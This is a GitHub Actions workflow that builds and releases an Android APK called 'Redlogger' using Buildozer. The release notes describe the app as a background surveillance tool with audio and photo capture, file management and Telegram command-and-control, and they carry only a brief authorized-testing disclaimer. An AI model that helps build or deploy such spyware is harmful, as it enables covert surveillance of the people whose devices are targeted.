name: Build Android APK

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: 🧾 Checkout repository
      uses: actions/checkout@v4

    - name: 🐍 Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.10'

    - name: ☕ Set up Java
      uses: actions/setup-java@v3
      with:
        distribution: 'temurin'
        java-version: '17'

    - name: 🧱 Install system dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y git zip unzip autoconf libtool pkg-config zlib1g-dev \
          libncurses-dev cmake libffi-dev libssl-dev openjdk-17-jdk curl

    - name: 🐍 Install Python dependencies
      run: |
        python -m pip install --upgrade pip
        pip install buildozer cython

    - name: 💾 Cache Buildozer global directory
      uses: actions/cache@v3
      with:
        path: ~/.buildozer
        key: buildozer-${{ runner.os }}-${{ hashFiles('**/buildozer.spec') }}

    - name: 💾 Cache Buildozer project build
      uses: actions/cache@v3
      with:
        path: redlogger_client/.buildozer
        key: buildozer-deps-${{ runner.os }}-${{ hashFiles('**/buildozer.spec') }}

    - name: ⚙️ Manually install Android SDK cmdline-tools
      run: |
        mkdir -p ~/.buildozer/android/platform/android-sdk/cmdline-tools
        cd ~/.buildozer/android/platform/android-sdk/cmdline-tools
        curl -sSL -o sdk.zip https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
        unzip -q sdk.zip -d latest
        rm sdk.zip

    - name: ✅ Accept Android SDK licenses
      run: |
        yes | ~/.buildozer/android/platform/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses

    - name: 🏗️ Build APK with Buildozer
      working-directory: redlogger_client
      env:
        ANDROID_HOME: /home/runner/.buildozer/android/platform/android-sdk
        PATH: /home/runner/.buildozer/android/platform/android-sdk/cmdline-tools/latest/bin:$PATH
      run: |
        buildozer android debug

    - name: 📂 List generated APKs
      working-directory: redlogger_client
      run: ls -la bin/

    - name: ☁️ Upload APK artifact
      uses: actions/upload-artifact@v4
      with:
        name: redlogger-debug-apk
        path: redlogger_client/bin/*.apk

    - name: 🚀 Create GitHub Release (if tagged)
      if: startsWith(github.ref, 'refs/tags/')
      uses: softprops/action-gh-release@v1
      with:
        files: redlogger_client/bin/*.apk
        name: Redlogger ${{ github.ref_name }}
        body: |
          ## Redlogger Android APK - v${{ github.ref_name }}

          ### 🔒 Warning
          Use this tool only for authorized testing. Illegal usage is strictly prohibited.

          ### 📦 APK Setup
          - Install APK on test device
          - Setup Telegram bot token and chat ID
          - (Optional) Configure No-IP

          ### ⚙️ Features
          - Background execution
          - Audio/photo capture
          - File management
          - Telegram C2 communication

        draft: false
        prerelease: false
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}